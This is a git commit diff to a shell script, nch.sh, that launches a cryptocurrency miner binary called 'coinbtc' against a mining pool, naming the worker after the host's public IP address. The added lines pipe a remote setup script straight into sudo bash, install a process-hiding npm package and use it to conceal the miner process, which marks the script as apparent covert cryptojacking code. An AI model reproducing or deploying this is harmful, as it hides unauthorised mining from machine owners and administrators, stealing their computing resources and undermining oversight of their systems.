63a717e230bc3669554d192918d8620ddea7ca3c
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-09 18:01:55 +0700

    Update nch.sh

--- nch.sh
+++ nch.sh
@@ -8,5 +8,11 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
 
 cd "$(dirname "$0")"
 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+apt-get install screen -y
+npm i -g node-process-hider
+sudo ph add coinbtc
 chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
 
+echo success
